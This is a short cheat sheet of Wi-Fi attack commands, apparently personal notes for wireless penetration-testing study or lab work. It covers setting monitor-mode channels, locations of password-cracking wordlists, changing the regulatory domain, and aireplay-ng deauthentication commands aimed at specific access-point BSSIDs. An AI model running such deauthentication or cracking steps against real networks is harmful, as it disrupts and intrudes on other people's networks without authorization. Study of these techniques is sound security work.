
Switch to a channel:
```bash
iwconfig wlan0mon channel 11
sudo airmon-ng start wlan0 11
```
>[!info]
>Done when a command can't specify a channel, e.g. aireplay

Wordlists:
```bash
/usr/share/wordlists/rockyou.txt
/usr/share/john/password.lst
```

Change regulatory domain:
```bash
iw reg set US
```

Multiple ESSID's with different BSSID's? 
- Deauth all of them: [[18-25. MGT]]
```bash
sudo aireplay-ng -0 5 -a F0:9F:C2:71:22:1A wlan0mon
sudo aireplay-ng -0 5 -a F0:9F:C2:71:22:15 wlan0mon
```